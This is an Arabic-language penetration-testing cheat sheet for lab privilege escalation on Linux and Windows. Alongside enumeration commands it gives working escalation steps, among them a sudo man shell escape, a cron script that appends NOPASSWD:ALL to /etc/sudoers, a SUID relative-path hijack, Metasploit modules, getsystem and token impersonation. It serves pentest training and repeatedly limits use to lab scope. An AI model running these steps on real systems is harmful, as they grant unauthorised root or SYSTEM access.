1. Initial Context

قبل أي PrivEsc: ثبّت المستخدم الحالي، النظام، المعمارية، والامتيازات المتاحة. لا تبدأ Exploit من التخمين.

القاعدة: Current User → OS/Build/Kernel → Privileges → Misconfiguration/Vulnerability → Validate → Escalate.
Meterpreter — تأكيد السياق METERPRETER
getuid sysinfo

2. Linux PrivEsc Enumeration

Privilege Escalation محلي، لكن الشبكة والـservices المحلية قد تكشف خدمة تعمل بصلاحية أعلى أو مسارًا داخليًا مهمًا.

وجود Service محلية أو PID بصلاحية عالية ليس exploit تلقائيًا. تحتاج ضعف صلاحيات/مسار كتابة/إعداد خاطئ أو ثغرة مثبتة.
Linux — الخدمات المستمعة محليًا VICTIM SHELL
ss -lntup ip addr ip route
خدمة مربوطة على localhost فقط قد تستحق Enumeration محليًا، لكن لا تفترض أنها PrivEsc بحد ذاتها.
Enumeration للـSUID root binaries VICTIM SHELL
find / -user root -perm -4000 -exec ls -ldb {} \;
هذه طريقة بديلة لاكتشاف setuid programs.
صلاحيات sudo VICTIM SHELL
sudo -l
دوّن الأوامر المسموحة وهل يوجد NOPASSWD. لا تشغّل شيئًا قبل فهم أثره.
SUID binaries VICTIM SHELL
find / -perm -4000 -type f 2>/dev/null
Linux Capabilities VICTIM SHELL
getcap -r / 2>/dev/null
Cron configuration VICTIM SHELL
cat /etc/crontab ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly 2>/dev/null
Writable files/directories بشكل مركز VICTIM SHELL
find / -writable -type f 2>/dev/null | head -n 100 find / -writable -type d 2>/dev/null | head -n 100
ركز على ملفات تستخدمها root/services/cron بدل التعامل مع كل نتيجة كمسار PrivEsc.
Linux — اختبار sudo بالمستخدم الحالي VICTIM SHELL
sudo -l
إذا طلب Password، استخدم فقط Password معروف للمستخدم الحالي من مسار اللاب.
Linux — التحول لمستخدم ببيانات معروفة VICTIM SHELL
su - [USERNAME]
لا تعمل password guessing داخل su؛ استخدم Credential موثق فقط.
sudo path — تحقق من المسموح أولًا VICTIM SHELL
sudo -l
إذا ظهر binary قابل للاستغلال ضمن sudo، راجع سلوكه وصلاحياته قبل التنفيذ. لا نخترع أمر escalation بدون binary محدد.
SUID path — تأكيد المرشح VICTIM SHELL
find / -perm -4000 -type f 2>/dev/null
انتقل فقط للـbinary الذي تعرف أن سلوكه يسمح بالتصعيد ضمن الـpreconditions.
Cron / weak-permission path — فحص المالك والكتابة VICTIM SHELL
ls -la [FILE] stat [FILE]
لا تعدّل ملف root/cron إلا إذا كان ذلك مطلوبًا صراحة في Lab.
البحث عن Linux local modules MSFCONSOLE
search type:exploit platform:linux local info [MODULE] show options

3. Linux PrivEsc Paths

هذه أهم مرحلة: ابحث عن مسارات التصعيد الموثقة مثل sudo، SUID، Cron، weak permissions، services، privileges وkernel/build.

مسارات Linux المهمة هنا: sudo / SUID / Cron / weak permissions / Kernel / chkrootkit / credentials، وWindows عبر privileges/systeminfo ثم أدوات enumeration عند الحاجة.
Sudo misconfiguration — مثال man الموثق VICTIM SHELL
sudo -l sudo man cat !/bin/bash
نفّذ هذا المسار فقط إذا sudo -l يسمح بتشغيل man بصلاحية أعلى.
Shell بصلاحية root إذا كانت الـsudo rule مطابقة.
Cron writable script — workflow موثق — LAB-SPECIFIC EXAMPLE VICTIM SHELL
printf '#! /bin/bash\necho "[USERNAME] ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
يفترض هذا المسار أن السكربت writable للمستخدم ويُشغّل كـroot عبر cron.
بعد تشغيل cron يصبح المستخدم المحدد قادرًا على sudo بدون كلمة مرور عند تحقق نفس السيناريو.
SUID binary calling relative helper — workflow موثق — LAB-SPECIFIC EXAMPLE VICTIM SHELL
strings ./welcome rm ./greetings cp /bin/bash ./greetings ./welcome
يفترض هذا المسار أن welcome يستدعي greetings؛ لا تطبق الاستبدال إلا إذا تحقق هذا السلوك.
يفتح root shell عند تحقق نفس الشروط.
Weak permissions على password files — توليد hash VICTIM SHELL
find / -not -type l -perm -o+w openssl passwd -6 -salt abc [CLEAR_PASSWORD]
استخدم hash الناتج فقط عند وجود weak permissions تسمح بتعديل ملف مناسب مثل shadow؛ تحقق من الصلاحيات أولًا.
LAB-SPECIFIC EXAMPLE — chkrootkit 0.49 — مسار موثق عند تطابق الإصدار MSFCONSOLE
use exploit/unix/local/chkrootkit set SESSION [SESSION_ID] set CHKROOTKIT /bin/chkrootkit run
تأكد من الإصدار والمسار قبل التشغيل.

4. Windows PrivEsc Enumeration

بعض مسارات PrivEsc تعتمد على Credential موجود فعليًا أو reuse منطقي؛ لا تستخدم Brute Force عشوائيًا بعد الوصول.

إذا حصلت على hashes/keys/secrets، انتقل إلى Credential Access Cheatsheet بدل تحويل ملف PrivEsc إلى ملف Credential Dumping.
Windows — تحديد المستخدم والنظام WINDOWS CMD
whoami whoami /priv whoami /groups systeminfo
سجّل Windows build والـarchitecture والـEnabled privileges.
Windows — الاتصالات والبورتات WINDOWS CMD
netstat -ano ipconfig /all route print
ربط PID بعملية على Windows WINDOWS CMD
tasklist /v
Privileges الحالية WINDOWS CMD
whoami /priv
الخدمات ومساراتها WINDOWS CMD
sc query state= all wmic service get name,displayname,pathname,startmode,startname
راجع service account والمسار؛ لا تعدّل خدمة لمجرد أنها تعمل كSYSTEM.
Scheduled Tasks WINDOWS CMD
schtasks /query /fo LIST /v
Autologon Registry WINDOWS CMD
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
إذا ظهرت بيانات حساسة فعليًا، تعامل معها لاحقًا ضمن Credential Access ولا تخترع قيمًا غير موجودة.
Meterpreter — Token/User context قبل أي Elevation METERPRETER
getuid
PrivescCheck / WinLogon discovery POWERSHELL
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
قد تكشف الأداة WinLogon credentials؛ تحقق من الـfinding قبل إعادة الاستخدام.
البحث عن Windows local modules MSFCONSOLE
search type:exploit platform:windows local info [MODULE] show options
تأكيد نجاح Windows Elevation METERPRETER
getuid
إذا تحقق التصعيد إلى SYSTEM فعليًا سيظهر سياق مثل NT AUTHORITY\SYSTEM.
Windows — إثبات السياق الجديد WINDOWS CMD
whoami whoami /priv
Windows — تأكيد نهائي بعد PrivEsc WINDOWS CMD
whoami whoami /priv hostname

5. Windows PrivEsc Paths

نفّذ فقط المسار الذي تدعمه الـEnumeration. لا يوجد Exploit واحد يصلح لكل Windows أو Linux.

تحذير: طابق OS/Kernel/Build/Architecture والـpreconditions. Local exploits قد تسبب crash أو عدم استقرار.
Windows — اختبار Credential معروف على حساب محلي WINDOWS CMD
runas /user:[USERNAME] cmd.exe
أدخل Password معروف عند الطلب؛ نجاح فتح process بالسياق الجديد هو التحقق العملي.
Meterpreter getsystem METERPRETER
getsystem
قد ينجح أو يفشل حسب session والصلاحيات والنظام؛ ليس مسارًا مضمونًا.
PowerUp — audit ثم credential clue POWERSHELL
powershell -ep bypass . .\PowerUp.ps1 Invoke-PrivescAudit
قد يظهر misconfig/leftover files مثل Unattend.xml؛ لا تفترض وجودها.
Token impersonation — عند توفر token مناسب METERPRETER
load incognito list_tokens -u impersonate_token [TOKEN_NAME]
استخدم اسم الإضافة incognito كما هو موضح هنا.

6. Verify Elevation & Handoff

بعد التصعيد: أثبت النتيجة، لا تكرر الاستغلال، ثم انتقل للهدف التالي في اللاب.

بعد PrivEsc: Credentials مطلوبة؟ → Credential Access. شبكة داخلية؟ → Pivoting. نقل أدوات/أدلة؟ → File Transfer. لا تكرر هذه المواضيع هنا.
لا تمسح Logs ولا تنشئ Persistence ولا تغيّر إعدادات النظام إلا إذا كان ذلك هدفًا صريحًا في Lab/Scope.
Linux — تحديد المستخدم والسياق VICTIM SHELL
whoami id uname -a cat /etc/os-release
النجاح النهائي في Linux PrivEsc يتأكد بـroot أو uid=0(root).
Linux — إثبات root VICTIM SHELL
whoami id
root / uid=0(root) = نجاح التصعيد عندما يظهر فعليًا.
Linux — تأكيد نهائي بعد PrivEsc VICTIM SHELL
whoami id hostname
Meterpreter — تثبيت سياق الجلسة METERPRETER
getuid background
إدارة الجلسات بعد النجاح MSFCONSOLE
sessions sessions -i [SESSION_ID]
